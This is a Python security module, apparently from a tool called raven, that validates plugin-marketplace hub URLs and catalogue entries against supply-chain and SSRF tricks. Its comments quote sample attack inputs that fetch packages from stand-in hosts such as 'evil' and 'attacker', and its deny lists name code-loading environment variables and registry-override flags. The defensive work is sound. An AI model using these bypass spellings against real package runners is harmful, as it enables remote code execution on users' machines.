"""What the market is allowed to fetch, and what a catalogue entry may ask for.

Two trust boundaries meet in the market, and neither is the user:

* the **hub endpoint** (``RAVEN_PLUGHUB_URL`` / ``RAVEN_SKILLHUB_URL``): whoever
  answers it dictates the catalogue, so a plaintext or non-HTTP endpoint hands
  the catalogue to anyone on the path. That is a supply-chain hole rather than a
  transient outage, so it is refused instead of degraded.
* the **catalogue entry**: a stdio entry is a command line raven will execute.
  The entry cannot be trusted to name any command it likes, so this module
  narrows what a hub can pick to package runners whose payload is a visible
  package name, and refuses environment variables whose only purpose is to load
  code into the child.

Nothing here constrains a hand-written ``config.json`` -- a user editing their
own file is the trusted party. The checks apply to what arrives over the wire.
"""

from __future__ import annotations

import ipaddress
import re
import socket
from typing import Any
from urllib.parse import urlsplit


class HubTrustError(ValueError):
    """An endpoint or catalogue entry failed a trust check."""


_LOCAL_NAMES = frozenset({"localhost", "localhost.localdomain"})

# Package runners: the payload they execute is a package name sitting in `args`,
# which the install confirm shows the user verbatim. A shell, an interpreter, or
# an absolute path to a downloaded binary is not something a remote catalogue
# gets to choose -- widening this set is a deliberate act, not a config knob.
#
# `pipx` is deliberately absent even though it is a package runner. Its payload is
# the *second* positional (`pipx run <app>`), so the rule below -- the first
# non-flag token is the package -- validates the literal word "run" and lets every
# later flag through, including `--python-args "-c ..."`, which runs the
# attacker's code under a package name the confirm dialog still shows as
# trustworthy. Supporting it needs a subcommand-aware parser, and shipping the
# wrong parser here is remote code execution, so it stays out until someone
# writes that on purpose.
ALLOWED_COMMANDS = frozenset({"npx", "uvx", "bunx"})


# The command is only half of "the visible package name is the payload". Every
# runner also has flags that move the payload somewhere the name no longer
# describes: `npx -p evil-pkg server-github` runs evil-pkg, and
# `npx --registry=https://evil/ @scope/real-name` runs the attacker's build of
# the real name. Both are refused here, so what the confirm dialog shows is what
# gets executed -- which matters most for an entry that also renders the user's
# API key into the child's environment.
_ARG_LEADING_ALLOW = frozenset({"-y", "--yes", "-q", "--quiet", "--silent"})
_DENIED_ARGS = frozenset(
    {
        # turn a runner back into an evaluator
        "-c",
        "--call",
        "-e",
        "--eval",
        "--node-options",
        # name a package other than the positional one
        "-p",
        "--package",
        "--from",
        "--spec",
        "--with",
        "--with-requirements",
        "--with-editable",
        "--pip-args",
        # resolve the positional name somewhere else
        "--registry",
        "--index",
        "--index-url",
        "--extra-index-url",
        "--default-index",
        "--find-links",
        "--userconfig",
        "--config",
        # relax transport trust while doing it, in each runner's own spelling
        "--insecure",
        "--no-verify-ssl",
        "--strict-ssl",
        "--cert",
        "--cafile",
        "--ca",
        # point the runner at a config file that says all of the above
        "--config-file",
        "--globalconfig",
    }
)

# A package name, optionally scoped, optionally pinned. No scheme, no path, no
# second slash: that is what keeps `github:attacker/pwn`,
# `https://evil/pwn.tgz`, `file:../x` and `git+ssh://...` out.
_PACKAGE_SPEC_RE = re.compile(
    r"^(@[A-Za-z0-9][\w.-]*/)?[A-Za-z0-9][\w.-]*"  # [@scope/]name
    r"([@=<>!~][\w.\-+*=]*)?$"  # optional @version / ==version
)

_ENV_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")

# A denylist, deliberately: every plugin needs its own credential variable, so
# there is no allowlist to write. Two families belong here -- names that load
# code the entry never named, and names that redirect where the named package is
# fetched from (`npm_config_registry` is `--registry` by another spelling, so
# denying the flag alone would not close it).
_ENV_DENY = frozenset(
    {
        "BASH_ENV",
        "CURL_CA_BUNDLE",
        "ENV",
        "GEM_HOME",
        "GEM_PATH",
        "HOME",
        "PATH",
        "PERL5LIB",
        "PERL5OPT",
        "REQUESTS_CA_BUNDLE",
        "RUBYLIB",
        "RUBYOPT",
        "SHELL",
        "SSL_CERT_DIR",
        "SSL_CERT_FILE",
        "VIRTUAL_ENV",
    }
)
_ENV_DENY_PREFIXES = (
    "LD_",
    "DYLD_",
    "NPM_CONFIG_",
    "NODE_",
    "PYTHON",
    "PIP_",
    "UV_",
    "GIT_",
    "BUN_",
    "PNPM_",
    "YARN_",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
    "NO_PROXY",
    # npm reads $XDG_CONFIG_HOME/npm/npmrc and uv reads
    # $XDG_CONFIG_HOME/uv/uv.toml, both of which can set a registry -- so this is
    # `--registry` a third time, spelled as a directory. It needs a file to point
    # at, and a plugin's own skill archive can supply one.
    "XDG_",
)

_HEADER_NAME_RE = re.compile(r"^[A-Za-z0-9!#$%&'*+.^_`|~-]+$")


def _host_is_local(host: str) -> bool:
    """Whether a URL host names this machine.

    ``*.localhost`` is deliberately *not* treated as local: hostile DNS can point
    ``evil.localhost`` at a public address, and treating it as loopback would let
    it serve a catalogue over plaintext.
    """
    if host.lower() in _LOCAL_NAMES:
        return True
    if _is_legacy_ip_form(host):
        return False
    addr = _as_ip(host)
    return addr is not None and addr.is_loopback


def _as_ip(host: str) -> ipaddress.IPv4Address | ipaddress.IPv6Address | None:
    """The address a host denotes, if it is written in canonical form."""
    try:
        return ipaddress.ip_address(host.strip("[]"))
    except ValueError:
        return None


def _is_legacy_ip_form(host: str) -> bool:
    """Whether a host is an address written in a form nobody agrees on.

    ``ipaddress`` parses only dotted quads, but a resolver also accepts
    ``127.1``, ``2130706433``, ``0x7f000001``, ``0`` and ``010.0.0.1`` -- and
    those disagree about what they mean: ``inet_aton`` reads ``010`` as octal 8
    while ``getaddrinfo`` on some platforms reads it as decimal 10. Classifying
    such a host is therefore guesswork, so these are refused rather than
    interpreted; the dotted-quad spelling of the same address still works.
    """
    bare = host.strip("[]")
    if _as_ip(bare) is not None:
        return False
    try:
        socket.inet_aton(bare)
        return True
    except OSError:
        pass
    # inet_aton is stricter than some resolvers about leading zeros, so also
    # refuse anything whose labels are purely numeric -- no real hostname is.
    labels = bare.split(".")
    return bool(bare) and all(label.isdigit() for label in labels if label != "")


def _split(url: str, what: str) -> Any:
    parts = urlsplit(url)
    if not parts.scheme or not parts.hostname:
        raise HubTrustError(f"{what} is not an absolute http(s) URL: {url!r}")
    if parts.username or parts.password:
        raise HubTrustError(f"{what} must not carry credentials in the URL: {url!r}")
    return parts


def _wire_host(url: str, parts: Any) -> str:
    """The host the HTTP client will really use, not the one urlsplit reports.

    They differ, and the difference was a bypass: IDNA maps the ideographic full
    stop U+3002 (and its fullwidth siblings) onto ``.``, so ``127.0.0.1`` spelled with them
    reaches urlsplit as one non-numeric label -- an ordinary hostname as far as
    every check here is concerned -- while httpx connects to 127.0.0.1. Judging
    the string the connect will use closes that whole class rather than one
    spelling of it.
    """
    try:
        import httpx

        return httpx.URL(url).host or (parts.hostname or "")
    except Exception:  # noqa: BLE001 -- a URL httpx cannot even parse is refused below
        return parts.hostname or ""


def _names_this_machine(host: str) -> bool:
    """Whether a host resolves to this machine by name rather than by address.

    Wider than the plaintext exemption on purpose: ``*.localhost`` is loopback by
    RFC 6761, so a hub handing back ``https://evil.localhost/x`` is pointing raven
    at itself -- but hostile DNS can also point that name at a public address,
    which is why it must not *buy* the http exemption. One name, two answers,
    depending on which question is being asked.
    """
    h = host.lower().rstrip(".")
    return h in _LOCAL_NAMES or h.endswith(".localhost")


def require_https(url: str, *, what: str) -> str:
    """Accept ``https``, or ``http`` only when the host is this machine.

    Loopback plaintext stays allowed because that is how the hub itself is
    developed; anything else on the network must be encrypted or the catalogue
    is whatever the path decides it is.
    """
    parts = _split(url, what)
    if parts.scheme == "https":
        return url
    if parts.scheme == "http" and _host_is_local(_wire_host(url, parts)):
        return url
    raise HubTrustError(f"{what} must use https (plain http is allowed only on localhost): {url!r}")


def require_public_https(url: str, *, what: str) -> str:
    """As :func:`require_https`, and the host may not be a private address.

    Used for URLs the hub *hands back* (a presigned download): those are
    followed without any further check, so a hub that answers with
    ``https://127.0.0.1:9000/...`` would be aiming raven's own credentials-free
    fetch at services behind the user's firewall. Only IP literals and local
    names are rejected -- resolving a hostname here would be a check the
    subsequent connect could invalidate anyway.
    """
    parts = _split(url, what)
    if parts.scheme != "https":
        raise HubTrustError(f"{what} must use https: {url!r}")
    host = _wire_host(url, parts)
    if _host_is_local(host) or _names_this_machine(host):
        raise HubTrustError(f"{what} must not point at this machine: {url!r}")
    if _is_legacy_ip_form(host):
        raise HubTrustError(f"{what} must write an address as a dotted quad, not {host!r}: {url!r}")
    addr = _as_ip(host)
    if addr is None:
        return url
    if addr.is_private or addr.is_link_local or addr.is_reserved or addr.is_multicast:
        raise HubTrustError(f"{what} must not point inside a private network: {url!r}")
    return url


def hub_endpoint(env_value: str | None, default: str, *, what: str) -> str:
    """Resolve a hub base URL from an override, falling back to ``default``."""
    raw = (env_value or "").strip()
    if not raw:
        return default.rstrip("/")
    return require_https(raw, what=what).rstrip("/")


def _check_env(env: Any) -> None:
    if env is None:
        return
    if not isinstance(env, dict):
        raise HubTrustError("catalog entry 'env' must be an object")
    for key in env:
        name = str(key)
        if not _ENV_NAME_RE.match(name):
            raise HubTrustError(f"catalog entry sets an unusable environment variable: {name!r}")
        upper = name.upper()
        if upper in _ENV_DENY or upper.startswith(_ENV_DENY_PREFIXES):
            raise HubTrustError(
                f"catalog entry may not set {name!r}: that name changes what code the "
                f"plugin process loads or where its package comes from"
            )


def _check_headers(headers: Any) -> None:
    if headers is None:
        return
    if not isinstance(headers, dict):
        raise HubTrustError("catalog entry 'headers' must be an object")
    for key, value in headers.items():
        if not _HEADER_NAME_RE.match(str(key)):
            raise HubTrustError(f"catalog entry sets an invalid header name: {key!r}")
        if any(c in str(value) for c in "\r\n"):
            raise HubTrustError(f"catalog entry header {key!r} contains a line break")


def _check_runner_args(args: Any) -> None:
    """The runner must resolve and execute the package name it displays.

    Three rules, in the order they are read: the flags *before* the package name
    come from a short allowlist (they may only say "do not prompt" or "be
    quiet"); the first non-flag token is a plain package spec, so no git ref,
    tarball URL or local path; and no identity-shifting flag appears anywhere,
    including after the name, because relying on a runner to stop parsing its own
    options at the first positional would make this depend on npm's argv
    behaviour rather than on a rule.
    """
    if not isinstance(args, list):
        raise HubTrustError("catalog entry 'args' must be a list")

    for arg in args:
        head = str(arg).split("=", 1)[0].lower()
        if head in _DENIED_ARGS:
            raise HubTrustError(
                f"catalog entry passes {head!r}, which would run or fetch something "
                f"other than the package name it shows"
            )

    seen_spec = False
    for arg in args:
        word = str(arg)
        if seen_spec:
            continue
        if word.startswith("-"):
            if word == "--":
                continue
            if word.split("=", 1)[0].lower() not in _ARG_LEADING_ALLOW:
                raise HubTrustError(f"catalog entry passes the runner flag {word!r}, which the market does not allow")
            continue
        if not _PACKAGE_SPEC_RE.match(word):
            raise HubTrustError(f"catalog entry names {word!r}, which is not a plain package name")
        seen_spec = True
    if not seen_spec:
        raise HubTrustError("catalog entry names no package for its runner to execute")


# The URLs an oauth block may name, in both spellings config.json accepts. Every
# one is somewhere raven will send an authorization code or ask for a token, so
# the catalogue does not get to point them at plaintext.
_OAUTH_URL_KEYS = (
    "issuer",
    "authorization_endpoint",
    "authorizationEndpoint",
    "token_endpoint",
    "tokenEndpoint",
    "registration_endpoint",
    "registrationEndpoint",
    "resource",
    "redirect_uri",
    "redirectUri",
)


def _check_oauth(oauth: Any) -> None:
    """The authorization-server facts a catalogue entry may pre-declare.

    Two rules. Every URL is https (or loopback plaintext, which is what the
    redirect is), because these are where an authorization code goes and where a
    token comes back. And no client secret: raven authorizes as a public client,
    so a secret arriving from a catalogue would be a shared secret published to
    every user -- not a credential, just a value that makes the flow look
    confidential while being anything but.
    """
    if oauth is None:
        return
    if not isinstance(oauth, dict):
        raise HubTrustError("catalog entry 'oauth' must be an object")
    for key in ("client_secret", "clientSecret"):
        if oauth.get(key):
            raise HubTrustError("catalog entry may not carry an oauth client secret; raven is a public client")
    for key in _OAUTH_URL_KEYS:
        value = oauth.get(key)
        if value:
            require_https(str(value), what=f"catalog entry oauth {key}")


def validate_mcp_connection(cfg: dict) -> dict:
    """Return ``cfg`` unchanged, or raise :class:`HubTrustError`.

    ``cfg`` is the camelCase stanza built from a catalogue entry plus the user's
    form input, i.e. exactly what is about to be written to ``config.json``.
    """
    _check_env(cfg.get("env"))
    _check_headers(cfg.get("headers"))
    _check_oauth(cfg.get("oauth"))

    kind = str(cfg.get("type") or "stdio")
    if kind == "stdio":
        command = str(cfg.get("command") or "")
        if command not in ALLOWED_COMMANDS:
            raise HubTrustError(
                f"catalog entry wants to run {command!r}; the market only launches "
                f"package runners ({', '.join(sorted(ALLOWED_COMMANDS))})"
            )
        _check_runner_args(cfg.get("args") or [])
    else:
        url = str(cfg.get("url") or "")
        if not url:
            raise HubTrustError(f"catalog entry of type {kind!r} carries no url")
        require_https(url, what=f"catalog entry url for a {kind} server")
    return cfg


# A hub-supplied download is often presigned behind a redirect, so redirects
# cannot simply be refused there -- but they must be followed by hand, checking
# each hop. `follow_redirects=True` erases whatever a URL check established: a
# URL that passes require_public_https can 302 to http://127.0.0.1/admin, which
# is the exact request the check exists to prevent.
MAX_REDIRECTS = 4


def redirect_target(base: str, location: str, *, check, what: str) -> str:
    """The next hop of a redirect chain, validated like the first one."""
    from urllib.parse import urljoin

    return check(urljoin(base, location), what=f"{what} (redirect target)")


__all__ = [
    "ALLOWED_COMMANDS",
    "MAX_REDIRECTS",
    "HubTrustError",
    "hub_endpoint",
    "redirect_target",
    "require_https",
    "require_public_https",
    "validate_mcp_connection",
]
